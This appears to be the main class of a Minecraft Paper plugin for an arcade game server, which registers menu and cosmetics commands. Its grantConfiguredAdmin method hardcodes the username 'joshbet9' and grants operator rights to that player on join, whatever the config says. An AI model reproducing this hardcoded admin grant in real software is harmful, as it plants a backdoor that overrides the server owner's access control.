package au.com.testplex.modern;

import au.com.testplex.modern.menu.MenuService;
import au.com.testplex.modern.model.ArcadeCatalog;
import au.com.testplex.modern.model.GameDefinition;
import au.com.testplex.modern.player.PlayerPreferenceStore;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Independent Paper 26.3 entry point. This module intentionally does not depend
 * on the legacy Mineplex Reborn Maven reactor or its 1.8 NMS classes.
 */
public final class TestplexModernArcade extends JavaPlugin implements Listener {
    private ArcadeCatalog catalog;
    private PlayerPreferenceStore preferences;
    private MenuService menus;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        catalog = new ArcadeCatalog();
        preferences = new PlayerPreferenceStore(this);
        menus = new MenuService(this, catalog, preferences);
        getServer().getPluginManager().registerEvents(menus, this);
        getServer().getPluginManager().registerEvents(this, this);
        for (Player online : Bukkit.getOnlinePlayers()) {
            grantConfiguredAdmin(online);
        }

        bind("gamepanel", "Open the modern game panel.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openGamePanel(player);
        });
        bind("arcadecosmetics", "Open per-game Arcade cosmetics.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openCosmeticsHome(player);
        });
        bind("cosmetics", "Open the legacy-style Core Cosmetics menu.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openCoreCosmeticsHome(player);
        });
        bind("setgame", "Open the legacy Set Game screen.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openSetGamePage(player);
        });
        bind("arcadetest", "Inspect modern port readiness.", (sender) -> {
            if (!sender.hasPermission("testplex.modern.admin")) {
                sender.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
                return;
            }
            sender.sendMessage(ChatColor.AQUA + "Testplex Modern Arcade — Paper API 26.3");
            sender.sendMessage(ChatColor.GRAY + "Registered games: " + catalog.size());
            long ready = catalog.getGames().stream().filter(game -> game.isReadyForTest()).count();
            sender.sendMessage(ChatColor.GRAY + "Ready for in-game testing: " + ready);
            sender.sendMessage(ChatColor.GRAY + "All 16 games remain mechanics-in-progress; 14 first-pass ports are available when ArcadeMechanicsModern is installed.");
            sender.sendMessage(ChatColor.GRAY + "Cosmetic selections currently save to player profiles; visual hooks are not claimed complete.");
        });

        getLogger().info("Modern Arcade platform enabled: " + catalog.size()
                + " games registered; separate per-game cosmetic lines and win effects are available.");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        // Run one tick later so the operator state and permission recalculation
        // are authoritative before the tester opens Game Panel or /arcadeport.
        Bukkit.getScheduler().runTask(this, () -> {
            if (event.getPlayer().isOnline()) grantConfiguredAdmin(event.getPlayer());
        });
    }

    private void grantConfiguredAdmin(Player player) {
        java.util.List<String> admins = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
        // The isolated acceptance server must retain the requested owner even if
        // its old disk config predates the new admin-usernames key.
        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
        if (admins.stream().noneMatch(name -> name != null && name.equalsIgnoreCase(player.getName()))) return;
        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info("Granted Testplex Modern administrator/operator access to " + player.getName() + ".");
            player.sendMessage(ChatColor.GREEN + "Testplex Modern admin access enabled.");
        }
    }

    @Override
    public void onDisable() {
        if (preferences != null) preferences.flush();
    }

    @FunctionalInterface
    private interface SenderAction {
        void execute(CommandSender sender);
    }

    private void bind(String name, String description, SenderAction action) {
        PluginCommand command = getCommand(name);
        if (command == null) {
            throw new IllegalStateException("Missing command definition in plugin.yml: " + name);
        }
        command.setDescription(description);
        command.setExecutor((sender, ignored, label, args) -> {
            action.execute(sender);
            return true;
        });
    }

    public ArcadeCatalog getCatalog() { return catalog; }
}
